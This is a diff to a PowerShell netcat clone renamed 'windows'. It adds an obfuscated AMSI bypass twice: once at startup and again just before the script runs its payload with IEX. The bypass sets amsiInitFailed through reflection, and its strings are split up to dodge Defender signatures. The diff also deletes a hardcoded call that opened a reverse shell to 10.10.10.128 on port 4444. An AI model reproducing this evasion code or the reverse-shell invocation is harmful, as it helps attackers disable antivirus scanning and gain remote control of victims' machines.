@@ -20,7 +20,23 @@ function windows
     [alias("GenerateEncoded")][switch]$ge=$False,
     [alias("Help")][switch]$h=$False
   )
-  
+
+  ############### AMSI BYPASS (2025) ###############
+  # Reflectively set AmsiUtils.amsiInitFailed = $true so AMSI returns "clean"
+  # for every subsequent scan in this process. Strings are split with
+  # [String]::Join('', ...) so the bypass itself doesn't match Defender
+  # signatures for 'System.Management.Automation.AmsiUtils' / 'amsiInitFailed'.
+  try {
+    $__a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
+    $__b = [String]::Join('', 'am','siIn','itF','ailed')
+    $__t = [Ref].Assembly.GetType($__a)
+    if ($__t) {
+      $__f = $__t.GetField($__b, 'NonPublic,Static')
+      if ($__f) { $__f.SetValue($null, $true) }
+    }
+  } catch { }
+  ############### AMSI BYPASS ###############
+
   ############### HELP ###############
   $Help = "
 windows - Netcat, The Powershell Version
@@ -918,6 +934,20 @@ Examples:
   elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
   ########## RETURN GENERATED PAYLOADS ##########
   
+  ########## AMSI BYPASS (2025) - pre-execution ##########
+  # Re-run the bypass immediately before IEX in case the earlier one was
+  # skipped (e.g. fresh runspace) or the field was reset.
+  try {
+    $__a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
+    $__b = [String]::Join('', 'am','siIn','itF','ailed')
+    $__t = [Ref].Assembly.GetType($__a)
+    if ($__t) {
+      $__f = $__t.GetField($__b, 'NonPublic,Static')
+      if ($__f) { $__f.SetValue($null, $true) }
+    }
+  } catch { }
+  ########## AMSI BYPASS ##########
+  
   ########## EXECUTION ##########
   $Output = $null
   try
@@ -946,4 +976,3 @@ Examples:
   }
   ########## EXECUTION ##########
 }
-windows -c 10.10.10.128 -p 4444 -e cmd
